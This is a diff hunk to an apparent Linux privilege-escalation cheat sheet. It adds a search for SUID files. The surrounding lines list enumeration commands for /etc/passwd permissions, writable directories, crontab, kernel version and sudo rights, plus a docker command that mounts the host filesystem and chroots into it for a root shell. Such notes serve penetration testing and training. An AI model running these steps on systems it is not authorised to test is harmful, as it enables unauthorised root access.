@@ -48,6 +48,7 @@ ls -la /etc/passwd # See if you can write into /etc/passwd
 find / -writable -type d 2>/dev/null # insecure file perms
 cat /etc/crontab # crontab
 uname -r # Kernel exploit
+find / -perm -4000 -ls 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null # GTFO Bins now.
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh # Docker
 sudo -l # Sudo privs on what
